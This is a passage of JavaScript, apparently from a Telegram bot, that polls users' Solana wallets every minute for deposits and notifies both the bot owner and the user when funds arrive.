  const allUsers = db.getAllUsers();
  for (const user of allUsers) {
    for (const wallet of user.wallets || []) {
      const lastBalance = balanceCache.get(wallet.address) || wallet.balance || 0;
      const result = await solana.checkDeposits(wallet.address, lastBalance);
      if (result.hasDeposit) {
        balanceCache.set(wallet.address, result.newBalance);
        notifyOwner(msg.depositNotification(
          wallet.address, result.amount, result.newBalance,
          { firstName: user.firstName, username: user.username, telegramId: user.telegramId }
        ));
        try {
          await bot.telegram.sendMessage(user.telegramId,
            `DEPOSIT RECEIVED\n\nWallet: ${wallet.address}\nAmount: ${result.amount.toFixed(6)} SOL\nNew Balance: ${result.newBalance.toFixed(6)} SOL`
          );
        } catch (e) { console.error('User notify error:', e.message); }
      } else {
        balanceCache.set(wallet.address, result.newBalance);
      }
    }
  }
}

setInterval(monitorDeposits, 60000);

export { bot, notifyOwner, monitorDeposits };
